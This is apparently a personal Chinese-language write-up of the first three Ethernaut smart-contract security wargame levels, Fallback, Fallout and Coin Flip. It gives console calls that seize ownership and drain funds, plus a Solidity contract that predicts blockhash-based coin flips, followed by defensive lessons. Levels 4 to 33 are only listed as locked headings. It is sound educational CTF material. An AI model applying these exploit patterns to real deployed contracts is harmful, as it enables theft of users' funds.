# Ethernaut Challenges Writeup
## 项目介绍

[Ethernaut](https://ethernaut.openzeppelin.com/) 是 OpenZeppelin 开发的一个 Web3/Solidity 的游戏，通过闯关的方式来学习智能合约安全。每一关都是一个需要被攻破的智能合约，通过发现和利用合约中的漏洞来通过挑战。本项目记录了suu的每日解题过程。仅供参考，欢迎交流。

个人感觉的难度：
- [Easy] - 基础概念和简单漏洞
- [Medium] - 需要理解合约机制和常见攻击方式
- [Hard] - 复杂的漏洞利用和高级概念

## 08.01.2025

## 01. Fallback ✅ [Easy]

这关主要考察 fallback 函数的知识点：
- `receive()` 函数在合约接收 ETH 时被调用
- `fallback()` 函数在调用不存在的函数时被调用
- 通过发送少量 ETH 并调用 `contribute()` 函数来满足条件
- 最后通过 `receive()` 函数获取合约所有权

攻击步骤：
1. 调用 `contribute()` 并发送少量 ETH (<0.001)
```js
await contract.contribute({value: web3.utils.toWei('0.0001')});
```

2. 直接向合约发送 ETH 触发 `receive()`
```js
await contract.sendTransaction({value: web3.utils.toWei('0.0001')});
```

3. 调用 `withdraw()` 提取所有 ETH
```js
await contract.withdraw();
```

## 02. Fallout ✅ [Easy]

这关主要考察早期 Solidity 版本的构造函数问题：
- 老版本使用与合约同名的函数作为构造函数
- 如果函数名称与合约名不完全一致,就变成了普通函数
- 攻击者可以直接调用该函数获取所有权

攻击步骤：
1. 直接调用 `Fal1out()` 函数获得合约所有权
```js
await contract.Fal1out();
```

2. 调用 `collectAllocations()` 提取资金
```js
await contract.collectAllocations();
```

学习要点：
- 构造函数的安全性
- 代码审计的重要性
- 新版本使用 `constructor` 关键字更安全

## 03. Coin Flip ✅ [Medium]

这关主要考察区块链的随机数问题：
- 链上随机数可以被预测
- `block.number` 等区块信息是公开的
- 攻击者可以在同一区块复制计算逻辑

攻击步骤：
1. 部署攻击合约复制游戏合约的计算逻辑
2. 手动调用 `attackCoin()` 十次（每次等待新区块）
3. 确认胜利次数达到10次

> 注意：不能使用循环连续调用 `attackCoin()` 十次，因为每次猜测都需要在不同区块中进行。如果在同一个区块中多次调用，会使用相同的 `blockhash`，导致预测结果相同。

攻击合约代码：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract attack {
    ICoinFlip public targetContract;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _targetAddress) {
        targetContract = ICoinFlip(_targetAddress);
    }

    function attackCoin() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        targetContract.flip(side);
    }
}
```

学习要点：
- 链上随机数的局限性
- 不应使用区块信息作为随机源
- 可以使用 Chainlink VRF 等预言机获取真随机数
- 理解区块链的时序性，每个区块的信息都是唯一的

## 04. Telephone 🔒

## 05. Token 🔒

## 06. Delegation 🔒

## 07. Force 🔒

## 08. Vault 🔒

## 09. King 🔒

## 10. Re-entrancy 🔒

## 11. Elevator 🔒

## 12. Privacy 🔒

## 13. Gatekeeper One 🔒

## 14. Gatekeeper Two 🔒

## 15. Naught Coin 🔒

## 16. Preservation 🔒

## 17. Recovery 🔒

## 18. Magic Number 🔒

## 19. Alien Codex 🔒

## 20. Denial 🔒

## 21. Shop 🔒

## 22. Dex 🔒

## 23. Dex Two 🔒

## 24. Puzzle Wallet 🔒

## 25. Motorbike 🔒

## 26. DoubleEntryPoint 🔒

## 27. Good Samaritan 🔒

## 28. Gatekeeper Three 🔒

## 29. Switch 🔒

## 30. Privacy 2 🔒

## 31. Climber 🔒

## 32. Recovery 2 🔒

## 33. Puppet 🔒

